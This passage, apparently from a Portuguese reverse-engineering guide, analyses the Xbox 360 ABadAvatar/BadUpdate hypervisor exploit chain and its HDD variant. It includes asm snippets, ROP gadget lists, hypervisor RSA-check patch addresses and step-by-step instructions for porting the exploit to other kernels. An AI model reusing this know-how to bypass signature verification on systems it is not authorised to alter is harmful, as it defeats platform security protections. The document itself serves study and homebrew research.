Todos os endereços de funções e dados pré-calculados nas labels `DATA_ADDR` ficam deslocados por `0x90110000 - 0x98030000 = -0x7F20000` em relação ao BadUpdate.

### Padding obrigatório com `blr` (`4E 80 00 20`)

O README do ABadAvatar instrui:

> Stage 3 should be built at 0x90110000 instead of 0x98030000. Additionally, you should pad up to 0x10000 bytes with `4E 80 00 20` to ensure the module used in the exploit can be properly unloaded.

**Por que é necessário:** A Stage 2 carrega a Stage 3 na mesma página de código de `GamerProfile.xex`. Para que `XexUnloadImage` consiga descarregar o módulo corretamente após a Stage 3 ter sido executada (necessário para a sequência de saída de XamTask), a página de código precisa ter exatamente `0x10000` bytes válidos. O padding com `4E 80 00 20` (`blr`) garante que qualquer tentativa de executar bytes além do final do código real retorne imediatamente, evitando crashes.

### Lógica da race condition: idêntica

A função `main`, `RunUpdatePayloadThreadProc`, `BuildCipherTextLookupTable`, e todos os syscalls (`HvxKeysExecute`, `HvxEncryptedReserveAllocation`, `HvxEncryptedEncryptAllocation`, `HvxEncryptedReleaseAllocation`, `HvxPostOutputExploit`, etc.) são **bit-a-bit idênticos** entre ABadAvatar e BadUpdate. O mesmo ataque de race condition contra o campo `dec_output_buffer` no contexto do decoder LZX, no scratch buffer do HV, é usado.

### Nome do payload de saída

No ABadAvatar, o `XLaunchNewImage` no final de `RunUpdatePayloadThreadProc` usa `PAYLOAD:\\BadNyan.xex` como nome de arquivo de exemplo:

```asm
# ABadAvatar
lis   %r11, aPayloadBadnyan@ha
addi  %r3, %r11, aPayloadBadnyan@l   # "PAYLOAD:\\BadNyan.xex"
bl    _XLaunchNewImage
```

No BadUpdate original, o arquivo de destino é `PAYLOAD:\\default.xex`. Ambos são apenas nomes de exemplo — o usuário substitui pelo executável desejado (XeUnshackle, FreeMyXe, etc.).

---

## Stage 4 — Shell Code do Hypervisor (Ring −1): Idêntica

O arquivo `Stage4/BadUpdateExploit-4thStage.asm` do ABadAvatar é **idêntico** ao do BadUpdate original:

- Mesmos endereços de funções HV: `HvpRelocateCacheLines = 0x00000E14`, `HvpSetRMCI = 0x00000398`
- Mesmo endereço físico do segmento 3 do HV: `0x80000106.00030000`
- Mesmos endereços de patch RSA: HV em `0x80000104.00029B04`, kernel em `0x80000300.0007BFDC`
- O mesmo binário de dados limpos do HV (`Stage4_CleanHvData_Retail_17559.bin`) é usado
- A mesma sequência completa: SMC LED → restaurar segmento 3 → patch HV → desabilitar RMCI → patch kernel → reabilitar RMCI → retornar `0x41414141`

---

## Tabela de Diferenças de Código: BadUpdate vs ABadAvatar

| Aspecto | BadUpdate (grimdoomer) | ABadAvatar (shutterbug2000) |
|---|---|---|
| **Vetor de ataque inicial** | Save game de jogo (THAW gap name overflow, ou RBB) | Item de Avatar no perfil do usuário na flash |
| **Jogo necessário** | Sim (THAW NTSC/PAL/RF ou Rock Band Blitz) | Não — funciona direto do dashboard |
| **Contexto de execução** | Processo de jogo (Ring 3) | XamTask do `xam.xex` (Ring 3) |
| **Namespace de symlink** | `\??` | `\System??` |
| **Stage 1 como arquivo** | Save game no cartão USB | Offset `0x2200` no arquivo de item de Avatar na flash |
| **Stage 0** | N/A (overflow direto para stack pivot) | Payload comprimido no item de Avatar: exibe texto + stack pivot |
| **`_second_stage_chain_address`** | `0x00000000` (preenchido em runtime) | `second_stage_chain_addressA` (hardcoded da `Avatar.asm`) |
| **`_overwrite_loop_secondary_buffer_address`** | `0x00000000` (preenchido em runtime) | `overwrite_loop_secondary_buffer_address_hardcoded` |
| **Oracle XEX na flash** | `Flash:\\bootanim.xex` | `\\Device\\Flash\\GamerProfile.xex` |
| **Endereço de carga da Stage 3** | `0x98030000` | `0x90110000` |
| **Padding da Stage 3** | Não requerido | Necessário: pad até `0x10000` bytes com `4E 80 00 20` (`blr`) |
| **Sequência de saída antes da Stage 3** | Não existe — chama Stage 3 diretamente | Sim — sequência de 7+ gadgets para sair da XamTask e criar nova task |
| **Estrutura `_new_task_attributes`** | Não existe | Presente no segmento de dados |
| **`BuildConfig.asm` — target** | `TONY_HAWK_AW` ou `RB_BLITZ` | `AVATAR` (novo) |
| **Arquivo de config de jogo** | `TonyHawk.asm` / `RBBlitz.asm` | `Avatar.asm` (novo) |
| **Lógica da race condition (Stage 3)** | Implementação completa em C/asm | Idêntica — mesmo arquivo asm |
| **Stage 4 (hypervisor shellcode)** | Implementação original | Idêntica ao original |
| **Nome do payload de saída** | `PAYLOAD:\\default.xex` | `PAYLOAD:\\BadNyan.xex` (nome de exemplo) |

---

## Fluxo de Execução Completo do ABadAvatar

```
Dashboard (Ring 3, XamTask)
    → processa item de Avatar do perfil do usuário
    → descomprime e executa Stage 0 (estático, no item de Avatar)
    → Stage 0: exibe texto anti-golpe
    → Stage 0: stack pivot para Stage 1 (offset 0x2200 no item de Avatar)

Stage 1 (Ring 3, XamTask)
    → memcpy do segmento de dados para região gravável
    → NtAllocateVirtualMemory para Stage 2
    → ObCreateSymbolicLink monta PAYLOAD: → USB (\System??\PAYLOAD:)
    → ObCreateSymbolicLink monta Flash: → flash interna (\System??\Flash:)
    → lê BadUpdateExploit-2ndStage.bin do USB
    → stack pivot para Stage 2

Stage 2 (Ring 3, XamTask)
    → sinaliza via LEDs
    → carrega GamerProfile.xex (\Device\Flash\GamerProfile.xex)
    → captura oracle plain-text da página de código
    → loop: carrega/descarrega GamerProfile.xex, captura cipher text, compara com oracle
    → escreve cipher text da Stage 3 na página de código (0x90110000)
    → flush de cache (virtual + físico)
    → sequência de saída de XamTask (7+ gadgets):
        → desregistra XamTask atual
        → cria nova XamTask apontando para 0x90110000
        → suspende thread atual

Stage 3 (Ring 0, nova XamTask ou thread independente)
    → lê update_data.bin e BadUpdateExploit-4thStage.bin do USB
    → pré-computa tabela de cipher text (1024 variantes de whitening)
    → expõe cipher text do segmento 3 do HV via MmPhysical64KBMappingTable
    → thread worker (core 1): martela HvxKeysExecute em loop,
      monitora HV cipher text para overwrite do Block 14,
      no sucesso sobrescreve syscall table + chama Stage 4 + XLaunchNewImage
    → thread principal: loop apertado lê cipher text do scratch buffer,
      compara com tabela de lookup, atrasa, martela dec_output_buffer
      com pointer cipher text malicioso para ganhar a race

Stage 4 (Ring −1, hypervisor)
    → LED laranja via SMC
    → restaura segmento 3 corrompido do HV com cópia limpa embutida
    → patch HV: bl XeCryptBnQwBeSigVerify → li r3, 1
    → desabilita RMCI
    → patch kernel: bl XeCryptBnQwBeSigVerify → li r3, 1
    → reabilita RMCI
    → retorna 0x41414141

Stage 3 (Ring 0, de volta)
    → LED verde
    → XLaunchNewImage("PAYLOAD:\\BadNyan.xex")
```

---

# ABadAvatarHDD — Como funciona e diferenças de código

**Repositório:** https://github.com/rain2591/ABadAvatarHDD-rain2591  
**Autor:** rain2591  
**Base:** hex-edit dos binários compilados do ABadAvatar (shutterbug2000)

ABadAvatarHDD é uma modificação de **apenas um campo de dados** do ABadAvatar original: a URL de dispositivo que o exploit usa ao montar o symlink `PAYLOAD:`. Em vez de apontar para o pendrive USB (`\Device\Mass0\`), ele aponta para a **partição 1 do HDD interno** (`\Device\Harddisk0\Partition1\`). Isso significa que todos os arquivos de payload (Stage 2, Stage 3, Stage 4, `update_data.bin`, `xke_update.bin`, `default.xex`) ficam no HD interno do console — **nenhum pendrive é necessário durante a execução**.

> O autor explica explicitamente: *"As i will not be contributing back to the original fork this repository will be updated only as there will not be any code worth sending back to Shutterbugs as i have **hex edited** the payloads as opposed to modifying his source and recompiling it."*

---

## O que muda: a única diferença técnica

### O campo `_hdd_symlink_path_str` em `BadUpdateExploit_Data.asm`

Em `Common/BadUpdateExploit_Data.asm`, o campo que define o destino do symlink `PAYLOAD:` é:

```asm
_hdd_symlink_path_str:
    .ifdef DEBUG_BUILD
        .ascii "\\Device\\Harddisk0\\Partition1\\BadUpdatePayload"
    .else
        .ascii "\\Device\\Mass0\\BadUpdatePayload"
    .endif
```

O ABadAvatar original compila para **RETAIL_BUILD**, resultando no caminho USB:

```
\Device\Mass0\BadUpdatePayload          ← 31 bytes (ABadAvatar, USB)
```

O ABadAvatarHDD troca esse caminho pelo caminho do HD interno:

```
\Device\Harddisk0\Partition1\BadUpdatePayload  ← 46 bytes (ABadAvatarHDD, HDD)
```

A equivalência em código fonte seria simplesmente alterar a linha do `RETAIL_BUILD` de:

```asm
# ABadAvatar (USB)
.ascii "\\Device\\Mass0\\BadUpdatePayload"
```

para:

```asm
# ABadAvatarHDD (HDD interno)
.ascii "\\Device\\Harddisk0\\Partition1\\BadUpdatePayload"
```

Como a string HDD é **15 bytes mais longa**, um hex edit simples exige também atualizar os dois campos de comprimento da `UNICODE_STRING` que apontam para essa string (os dois valores `.short hdd_symlink_path_str_length` e `.short hdd_symlink_path_str_length + 1` no `_hdd_symlink_mount` logo abaixo). O autor fez isso manualmente nos binários compilados.

---

## Quais arquivos foram hex-editados

### Arquivos modificados

| Arquivo | O que foi alterado |
|---|---|
| `Content/.../E0002FF78DFBDE7B` | Perfil do Avatar (335 KB) — contém Stage 0 e Stage 1 embutidos; `_hdd_symlink_path_str` e campos de comprimento da UNICODE_STRING atualizados |
| `BU/BadUpdateExploit-2ndStage.bin` | Stage 2 ROP chain (2.1 MB) — segmento de dados do exploit embutido; mesmo campo `_hdd_symlink_path_str` atualizado |

### Arquivos idênticos ao ABadAvatar original

Os seguintes arquivos têm **hash SHA idêntico** ao ABadAvatar de shutterbug2000 — não foram tocados porque não contêm referências a `Mass0` ou `Harddisk0`:

| Arquivo | Motivo para não mudar |
|---|---|
| `BU/BadUpdateExploit-3rdStage.bin` | Stage 3 apenas lê de `PAYLOAD:\` (symlink já remapeado) e `Flash:\` |
| `BU/BadUpdateExploit-4thStage.bin` | Stage 4 é shellcode do hypervisor puro — sem paths de arquivo |
| `BU/update_data.bin` | Dados LZX puros, sem strings de caminho |
| `BU/xke_update.bin` | Payload XKE puro, sem strings de caminho |

---

## Por que Stage 3 não precisa de mudança

O symlink `PAYLOAD:` é criado na Stage 1 pela chamada `ObCreateSymbolicLink`. Uma vez criado, ele aponta para `\Device\Harddisk0\Partition1\BadUpdatePayload`. Todas as referências subsequentes a `PAYLOAD:\<arquivo>` — feitas na Stage 2 (para ler Stage 2 si mesmo, Stage 3, Stage 4), Stage 3 (para ler `update_data.bin`, `xke_update.bin`, Stage 4, e o payload final) — usam o symlink abstrato `PAYLOAD:`, que o kernel resolve para o caminho concreto. Como o symlink já aponta para HDD, Stage 3, Stage 4 e todos os dados funcionam sem modificação.

---

## Pacote de payload incluso

O ABadAvatarHDD inclui um pacote completo e pronto para uso:

| Arquivo | Descrição |
|---|---|
| `BU/default.xex` | XeUnshackle 1.02 — remove restrições de software e lança Aurora |
| `BU/XeUnshackleAutoStart.txt` | Contém `0.00` — instrui o XeUnshackle a iniciar automaticamente |
| `Aurora/` | Aurora Dashboard 0.7b.2 — substituto de dashboard para rodar jogos |
| `Plugins/` | Proto V2.4 (stealth) e outros plugins |
| `launch.ini` | Configuração do FreeStyle Dash / Aurora pré-configurada para HDD |

O arquivo `BU/XeUnshackleAutoStart.txt` com conteúdo `0.00` é lido pelo XeUnshackle como indicador de versão/autostart — ele instrui o XeUnshackle a pular a tela de confirmação e aplicar os patches imediatamente, carregando Aurora em seguida.

---

## Diagrama do caminho de armazenamento

```
ABadAvatar (original / USB):
  Avatar item na flash
    → Stage 0 + Stage 1 no item
    → monta PAYLOAD: → \Device\Mass0\BadUpdatePayload   ← USB pendrive
    → lê Stage 2 do USB
    → Stage 2, 3, 4 e payloads ficam no USB

ABadAvatarHDD (HDD interno):
  Avatar item na flash
    → Stage 0 + Stage 1 no item (hex-editado)
    → monta PAYLOAD: → \Device\Harddisk0\Partition1\BadUpdatePayload  ← HDD interno
    → lê Stage 2 do HDD
    → Stage 2, 3, 4 e payloads ficam no HDD interno
```

---

## Tabela de Diferenças de Código: ABadAvatar vs ABadAvatarHDD

| Aspecto | ABadAvatar (shutterbug2000) | ABadAvatarHDD (rain2591) |
|---|---|---|
| **Armazenamento dos payloads** | Pendrive USB | HD interno do Xbox 360 |
| **Método de modificação** | Código fonte compilado | Hex edit dos binários |
| **`_hdd_symlink_path_str`** | `\Device\Mass0\BadUpdatePayload` | `\Device\Harddisk0\Partition1\BadUpdatePayload` |
| **Avatar profile** | Aponta para USB | Hex-editado para apontar para HDD |
| **`BadUpdateExploit-2ndStage.bin`** | Aponta para USB | Hex-editado para apontar para HDD |
| **`BadUpdateExploit-3rdStage.bin`** | Original | Idêntico (não modificado) |
| **`BadUpdateExploit-4thStage.bin`** | Original | Idêntico (não modificado) |
| **`update_data.bin`** | Original | Idêntico (SHA igual) |
| **`xke_update.bin`** | Original | Idêntico (SHA igual) |
| **Payload padrão incluso** | `BadNyan.xex` (exemplo) | `default.xex` (XeUnshackle 1.02 → Aurora) |
| **Pacote completo pronto** | Não | Sim (Aurora + Proto + plugins + launch.ini) |
| **`XeUnshackleAutoStart.txt`** | Não incluso | `0.00` (auto-start do XeUnshackle) |

---

## Resumo: o que seria necessário para recompilar do zero

Para recriar o ABadAvatarHDD a partir do código fonte, bastaria uma única mudança no arquivo `Common/BadUpdateExploit_Data.asm`:

```asm
# Antes (ABadAvatar, RETAIL_BUILD):
_hdd_symlink_path_str:
    .ifdef DEBUG_BUILD
        .ascii "\\Device\\Harddisk0\\Partition1\\BadUpdatePayload"
    .else
        .ascii "\\Device\\Mass0\\BadUpdatePayload"
    .endif

# Depois (ABadAvatarHDD, RETAIL_BUILD):
_hdd_symlink_path_str:
    .ifdef DEBUG_BUILD
        .ascii "\\Device\\Harddisk0\\Partition1\\BadUpdatePayload"
    .else
        .ascii "\\Device\\Harddisk0\\Partition1\\BadUpdatePayload"
    .endif
```

Em outras palavras: usar o mesmo caminho de HDD (`\Device\Harddisk0\Partition1\BadUpdatePayload`) tanto para `DEBUG_BUILD` quanto para `RETAIL_BUILD`, em vez de usar o path do USB no `RETAIL_BUILD`. O assembler recalcularia automaticamente o `hdd_symlink_path_str_length` e todos os endereços do segmento de dados. Nenhum outro arquivo de código fonte precisaria ser alterado.

---

# Suporte a múltiplas versões de kernel — o que precisaria mudar

**Contexto:** Atualmente o exploit compila apenas para o kernel retail **17559** (`KernelConfig_Retail_17559.asm`). A dependência de versão de kernel é **independente** do jogo-alvo (Tony Hawk, Rock Band Blitz, etc.): qualquer combinação jogo + versão de kernel requer o `KernelConfig` adequado. Tudo que envolve endereços de funções, gadgets ROP, dados do hypervisor e o próprio payload de atualização está calibrado para a versão 17559 em específico. Para portar o exploit para outro kernel seria necessário mapear e atualizar seis categorias de dados independentes.

---

## Por que o exploit é específico de versão?

A resposta curta: o exploit executa código arbitrário usando uma ROP chain cujos gadgets são instruções reais do kernel e do XAM, com endereços que mudam a cada versão. Além disso, o Stage 4 (payload do hypervisor) contém endereços físicos de funções internas do HV e de bytes-alvo a patchear — todos derivados de reverse engineering do firmware 17559 em específico.

---

## Categoria 1 — Endereços de funções do kernel (Stage 2 + Stage 3)

O arquivo `Common/KernelConfig_Retail_17559.asm` define 16 endereços de funções do kernel:

```
DbgPrint, DbgBreakPoint, HalSendSMCMessage, KeFlushCacheRange, KeLockL2,
KeStallExecutionProcessor, MmFreePhysicalMemory, MmGetPhysicalAddress,
NtAllocateVirtualMemory, NtClose, ObCreateSymbolicLink, RtlInitAnsiString,
VdDisplayFatalError, XexLoadImage, XexUnloadImage, memcmp
```

Essas funções são exportadas (ou localizáveis por símbolo) no binário do kernel. Para um kernel diferente:

1. Extrair o binário do kernel da atualização (o kernel é o arquivo protegido pelo HV dentro do `update_data.bin`)
2. Abrir em disassembler (IDA Pro, Ghidra, Radare2 com suporte a PPC big-endian)
3. Localizar cada símbolo e anotar o novo endereço
4. Atualizar `KernelConfig_Retail_<versão>.asm`

**Dificuldade:** Média — funções exported têm nomes conhecidos; funções como `memcmp` precisam de busca por padrão de bytes.

---

## Categoria 2 — Endereços de funções do XAM (Stage 2)

O kernel config também define 12 endereços de funções do XAM (o módulo de dashboard/sistema):

```
CreateFileA (export 1095), GetFileSize (export 1063), ReadFile (export 1052),
WriteFile (export 1054), CloseHandle (export 1044), CreateThread (export 1084),
ResumeThread (export 1085), GetLastError (export 1006),
memcpy, memset, XamLoaderLaunchTitle (export 420), XamLoaderTerminateTitle (export 425)
```

O XAM.xex está na flash do console em `\Device\Flash\`. Para um kernel diferente:

1. Extrair o `xam.xex` correspondente à versão (fica na atualização do dashboard)
2. Descriptografar/desempacotar o formato XEX2
3. Localizar cada export pelo número de ordinal documentado ao lado
4. Para `memcpy` e `memset` — busca por padrão de bytes
5. Atualizar `KernelConfig_Retail_<versão>.asm`

**Dificuldade:** Baixa — ordinals são fixos por design do ABI do Xbox 360; basta resolver o endereço do export table.

---

## Categoria 3 — System call ordinals e wrappers (Stage 3)

O kernel config define 7 ordinals de syscall e 6 endereços de funções-wrapper:

```
# Ordinals (mudam por versão de kernel):
sc_HvxPostOutputExploit (0x0D), sc_HvxFlushUserModeTb (0x21),
sc_HvxKeysExecute (0x42), sc_HvxEncryptedReserveAllocation (0x49),
sc_HvxEncryptedEncryptAllocation (0x4A), sc_HvxEncryptedReleaseAllocation (0x4C),
sc_HvxRevokeUpdate (0x65)

# Wrappers no kernel (endereços fixos do kernel, mesma metodologia da Categoria 1):
HvxKeysExGetKey, HvxKeysExSetKey, HvxEncryptedReserveAllocation,
HvxEncryptedReleaseAllocation, HvxEncryptedEncryptAllocation, HvxFlushDCacheRange
```

Os ordinals de syscall são definidos pelo hypervisor e podem variar entre versões. Para localizá-los: procurar por `sc` (opcode `0x44000002`) nos wrappers do kernel e ler o campo imediato da instrução `li r0, <ordinal>` que precede o `sc`.

**Dificuldade:** Baixa-média — wrappers facilmente identificáveis; os ordinals estão embutidos no código dos wrappers.

---

## Categoria 4 — Gadgets ROP no kernel e no XAM (Stage 2, Stage 1)

Esta é a categoria mais numerosa. O kernel config define ~22 gadgets ROP — sequências de instruções específicas cujos endereços são usados para construir as cadeias ROP:

```
# Gadgets no kernel:
__restgprlr_24, __restgprlr_26, __restgprlr_27, __restgprlr_28,
__restgprlr_29, __restgprlr_30, __restgprlr_31, stw_r3, mr_r31_to_r3,
mr_r31_to_r11, call_func_dispatch

# Gadgets no XAM:
stack_pivot, lwz_r3, lwz_r3_stw_r4, lwz_r10, lwz_r11_off_r31,
stw_r30_on_r31, stw_r3_onto_pointer, load_add_store_r10_r5_on_r11,
call_func_preload, mr_r1_to_r3, blr_nop, clamp_r3,
mul_r3_4_lwzx_r11, load_add_store_r11_r30_on_r31, call_ptr_off_r31

# Offsets do call_func_preload (dependem do stack frame do gadget):
cf_r3_offset (0x2C), cf_r4_offset (0x24), cf_r5_offset (0x1C),
cf_r6_offset (0x14), cf_r7_offset (0x0C)
```

Cada gadget é comentado no arquivo com a sequência exata de instruções que deve conter. Para portar:

1. Escrever um scanner de bytes que busca a sequência de opcodes PPC de cada gadget no binário do kernel / XAM
2. Para gadgets `__restgprlr_*`: são funções de epilogue padrão do compilador — padrão bem reconhecido
3. Para gadgets XAM: o XAM muda mais entre versões que o kernel, então mais atenção é necessária aqui
4. Os offsets `cf_r*_offset` dependem do stack layout de `call_func_preload` — verificar se mudaram

**Dificuldade:** Média-alta — scan de gadgets é automático, mas o XAM pode não ter todos os gadgets necessários na nova versão.

---

## Categoria 5 — `BootAnimCodePageAddress` (Stage 3)

```asm
# Em KernelConfig_Retail_17559.asm:
.set BootAnimCodePageAddress, 0x98030000
```

Este endereço é onde o `bootanim.xex` (a animação de boot do dashboard) é carregado na memória. **O Stage 3 inteiro é montado para executar a partir deste endereço** — a macro `DATA_ADDR` calcula todos os endereços internos como `BootAnimCodePageAddress + offset`.

Se o endereço mudar para a nova versão:
- É necessário **recompilar o Stage 3 do zero** (arquivo `Stage3/BadUpdateExploit-3rdStage.asm`)
- O author original avisa que isso é difícil — o Stage 3 foi escrito como assembly compilado a partir de C em partes isoladas
- Se o endereço não mudar (o que é possível — ele pode ser fixo na ABI), o binário pré-compilado continua funcionando

**Como verificar:** Debugar (ou analisar) a carga do `bootanim.xex` na versão alvo e confirmar o endereço de base.

**Dificuldade:** Alta se o endereço mudar (recompilação do Stage 3 manual); Baixa se o endereço for o mesmo.

---

## Categoria 6 — Dados específicos do hypervisor (Stage 4) ⚠️ A mais difícil

O Stage 4 (`Stage4/BadUpdateExploit-4thStage.asm`) contém quatro peças de dados hardcoded que requerem reverse engineering do próprio hypervisor — o componente mais protegido do sistema:

### 6a. Endereços de funções internas do HV

```asm
.set HvpRelocateCacheLines,  0x00000E14   # função interna, não exportada
.set HvpSetRMCI,             0x00000398   # função interna, não exportada
```

Essas são funções não-exportadas dentro do hypervisor. Para localizá-las:
- Extrair e descriptografar o binário do hypervisor da imagem de atualização
- No IDA/Ghidra, identificar `HvpRelocateCacheLines` pelo padrão de comportamento (mover cache lines usando `dcbst`/`sync`) e `HvpSetRMCI` pelo padrão de escrita no registro RMCI do processador

### 6b. Endereço do patch no HV (bypass de verificação de assinatura RSA)

```asm
hv_rsa_patch_address:
    .long 0x80000104, 0x00029B04   # instrução 'bl XeCryptBnQwBeSigVerify' em HvpImageSignatureVerification
```

Este é o endereço físico da instrução `bl XeCryptBnQwBeSigVerify` dentro de `HvpImageSignatureVerification` no hypervisor — ou seja, o endereço da instrução **original** `bl` que o Stage 4 sobrescreve com `li r3, 1` para que a verificação sempre retorne "assinatura válida".

Para localizar: no binário do HV, encontrar a função `HvpImageSignatureVerification` e identificar a chamada para `XeCryptBnQwBeSigVerify`.

### 6c. Endereço do patch no kernel (bypass de verificação de assinatura RSA)

```asm
kernel_rsa_patch_address:
    .long 0x80000300, 0x0007BFDC   # instrução 'bl XeCryptBnQwBeSigVerify' em XexpVerifyXexHeaders
```

Similar ao 6b, mas no kernel: o Stage 4 sobrescreve a instrução `bl XeCryptBnQwBeSigVerify` dentro de `XexpVerifyXexHeaders` com `li r3, 1`, desabilitando a verificação de assinatura de XEX. Para localizar: no binário do kernel, encontrar `XexpVerifyXexHeaders` (exportada) e identificar o `bl` para `XeCryptBnQwBeSigVerify`.

### 6d. Dados limpos do último segmento do HV (`Stage4_CleanHvData_Retail_17559.bin`)

```asm
hv_restore_data_address:
    .long 0x80000106, 0x00030000   # endereço físico do último segmento do HV (0x10000 bytes)
    
hypervisor_restore_data:
    .incbin "Stage4_CleanHvData_Retail_17559.bin"  # 0x10000 bytes limpos desse segmento
```

O exploit corrompe o último segmento do hypervisor (0x10000 bytes) durante a fase de race condition. O Stage 4 precisa restaurá-lo antes de patchear. Para um kernel diferente:
1. Extrair o binário do hypervisor da atualização
2. Identificar o offset do último segmento (0x10000 bytes)
3. Extrair esses bytes e salvar como `Stage4_CleanHvData_Retail_<versão>.bin`
4. Verificar se o endereço físico `0x80000106_00030000` ainda é correto para a nova versão

**Dificuldade:** Muito alta — requer acesso e análise do binário do hypervisor, que é criptografado e verificado por assinatura. Ferramentas da comunidade (xbdecompress, free60 tools) são necessárias.

---

## O que NÃO precisa mudar

| Componente | Motivo |
|---|---|
| Lógica da ROP chain (Stage 1 e Stage 2) | O algoritmo é abstrato; apenas os endereços dos gadgets mudam |
| Algoritmo de race condition (Stage 3) | A lógica do loop de corrida é idêntica entre versões |
| Algoritmo do payload do HV (Stage 4) | A estrutura do patch RSA é a mesma; só os endereços mudam |
| Gadgets.asm (macros) | As macros são abstrações; os endereços concretos estão no KernelConfig |
| BadUpdateExploit_Data.asm | Independente de versão de kernel |
| Endereços do game-specific config (TonyHawk.asm) | São endereços dentro do binário do jogo, não do kernel |

---

## Mudanças no código-fonte necessárias

### 1. Criar `Common/KernelConfig_Retail_<versão>.asm`

Copiar `KernelConfig_Retail_17559.asm` e preencher todos os campos com os novos endereços para a versão alvo. O template vazio já existe em `Common/KernelConfig_Debug.asm`.

### 2. Atualizar `Common/BuildConfig.asm`

Adicionar uma nova flag de build para a versão e um `.ifdef` correspondente:

```asm
# Antes (só 17559):
.ifdef RETAIL_BUILD
    .include "KernelConfig_Retail_17559.asm"
.else
    .include "KernelConfig_Debug.asm"
.endif

# Depois (multi-versão):
.ifdef KRNL_17559
    .include "KernelConfig_Retail_17559.asm"
.elseif KRNL_17544    # exemplo de outra versão
    .include "KernelConfig_Retail_17544.asm"
.elseif KRNL_17489
    .include "KernelConfig_Retail_17489.asm"
.else
    .include "KernelConfig_Debug.asm"
.endif
```

### 3. Atualizar `Stage4/BadUpdateExploit-4thStage.asm`

Adicionar blocos `.ifdef KRNL_<versão>` para os endereços e o `.incbin` do Stage 4:

```asm
.ifdef KRNL_17559

hv_rsa_patch_address:
    .long 0x80000104, 0x00029B04
kernel_rsa_patch_address:
    .long 0x80000300, 0x0007BFDC
...
    .incbin "Stage4_CleanHvData_Retail_17559.bin"

.elseif KRNL_17544

hv_rsa_patch_address:
    .long 0x80000104, 0x0002XXXX   # endereço do patch no HV para 17544
...
    .incbin "Stage4_CleanHvData_Retail_17544.bin"

.endif
```

E os endereços de funções internas do HV:

```asm
.ifdef KRNL_17559
    .set HvpRelocateCacheLines, 0x00000E14
    .set HvpSetRMCI,            0x00000398
.elseif KRNL_17544
    .set HvpRelocateCacheLines, 0x0000XXXX
    .set HvpSetRMCI,            0x0000XXXX
.endif
```

### 4. Atualizar `build_exploit.bat`

Adicionar suporte ao parâmetro de versão de kernel:

```bat
:: Exemplo: build_exploit.bat THAW KRNL_17559
if "%3" == "" (
    set KRNL_CONFIG=KRNL_17559
) else (
    set KRNL_CONFIG=%3
)
:: Adicionar --defsym %KRNL_CONFIG%=1 às linhas de compilação
```

### 5. Fornecer `Stage4_CleanHvData_Retail_<versão>.bin`

Um arquivo binário de exatamente 0x10000 bytes extraído do último segmento do hypervisor da versão alvo.

---

## Resumo de dificuldade por categoria

| Categoria | O que muda | Onde localizar | Dificuldade |
|---|---|---|---|
| Funções do kernel | ~16 endereços | Disassembly do kernel (símbolos conhecidos) | ★★☆☆☆ |
| Funções do XAM | ~12 endereços | Export table do XAM.xex por ordinal | ★☆☆☆☆ |
| Ordinals de syscall | ~7 valores | Wrappers no kernel (`li r0, X; sc`) | ★★☆☆☆ |
| Gadgets ROP | ~22 endereços | Scanner de padrão de bytes no kernel/XAM | ★★★☆☆ |
| BootAnimCodePageAddress | 1 endereço | Análise de carga do bootanim.xex | ★★☆☆☆ |
| Dados do hypervisor | 4 itens + bin | RE do hypervisor criptografado | ★★★★★ |

O item mais crítico e mais difícil é a Categoria 6: os dados do hypervisor. Os outros 5 itens são trabalho de reverse engineering convencional e razoavelmente sistemático. O hypervisor, por ser criptografado e verificado, requer ferramentas especializadas da comunidade Xbox 360 (free60, xbdecompress, ou dumps diretos via hardware) e conhecimento profundo do sistema.

---

## Exemplo de hierarquia de arquivos para suporte multi-kernel

```
Common/
    KernelConfig_Retail_17559.asm      ← já existe
    KernelConfig_Retail_17544.asm      ← a criar
    KernelConfig_Retail_17489.asm      ← a criar
    KernelConfig_Retail_17150.asm      ← a criar
    ...
Stage4/
    Stage4_CleanHvData_Retail_17559.bin  ← já existe
    Stage4_CleanHvData_Retail_17544.bin  ← a criar
    Stage4_CleanHvData_Retail_17489.bin  ← a criar
    ...
```

Cada par `KernelConfig_Retail_<ver>.asm` + `Stage4_CleanHvData_Retail_<ver>.bin` representa um novo kernel suportado. Toda a lógica de código permanece intacta — apenas os dados de endereços mudam.

---

# Extraindo informações a partir de um dump da NAND (.bin)

**Contexto:** A pergunta anterior listou seis categorias de dados necessárias para portar o exploit a um novo kernel. Esta seção responde: *"eu tenho um dump da NAND em .bin — consigo extrair essas informações?"*

A resposta curta é: **parcialmente sim, mas algumas informações exigem a CPU key**, que não está presente no dump da NAND.

---

## O que está no dump da NAND

O dump da NAND contém toda a cadeia de boot do Xbox 360:

| Conteúdo | Formato | Chave de criptografia |
|---|---|---|
| Bootloaders (1BL–CB–CD–CE/CF/CG) | Cabeçalho proprietário | Assinatura RSA pública + derivação per-console no CB |
| Hypervisor (HV) | Binário PPC raw embutido nos bootloaders | **Verificação per-console** (derivada da CPU key) |
| `xboxkrnl.exe` (kernel) | XEX2 | **Retail XEX2 key** — chave pública conhecida ✅ |
| `xam.xex` (dashboard system) | XEX2 | **Retail XEX2 key** — chave pública conhecida ✅ |
| `bootanim.xex` e outros XEXs | XEX2 | **Retail XEX2 key** — chave pública conhecida ✅ |
| Metadados do sistema de arquivos | FATX | Leitura direta |

> **Nota importante:** Os arquivos XEX2 (kernel, XAM, etc.) usam a mesma chave pública de criptografia que os pacotes de atualização oficiais da Microsoft — a **retail XEX2 key**, que é de conhecimento público há mais de 15 anos na comunidade de modding. A CPU key só é necessária para acessar o binário do hypervisor, que é verificado pela cadeia de bootloaders.

---

## O que você PODE extrair sem a CPU key

| Informação | Método | Relação com o port |
|---|---|---|
| **Versão do kernel** | Cabeçalho XEX2 (`execution_id`) não é criptografado | Identifica qual `KernelConfig_Retail_<ver>.asm` criar |
| **Versão dos bootloaders** | Cabeçalho dos bootloaders é legível | Confirma revisão de hardware (Falcon/Jasper/Trinity) |
| **Endereços de funções do kernel** | Descriptografar `xboxkrnl.exe` com a retail key | Categoria 1 |
| **Endereços de funções do XAM** | Descriptografar `xam.xex` com a retail key | Categoria 2 |
| **Ordinals de syscall** | Análise do `xboxkrnl.exe` descriptografado | Categoria 3 |
| **Gadgets ROP** | Scan de padrão nos binários descriptografados | Categoria 4 |
| **BootAnimCodePageAddress** | Análise do `bootanim.xex` descriptografado | Categoria 5 |

---

## O que requer a CPU key (apenas Categoria 6)

| Informação | Por quê | Categoria do port |
|---|---|---|
| Funções internas do HV | HV é embutido nos bootloaders com proteção per-console | Categoria 6 |
| `Stage4_CleanHvData_*.bin` | Requer acesso ao HV descriptografado | Categoria 6 |

---

## O que é a CPU key e onde ela está

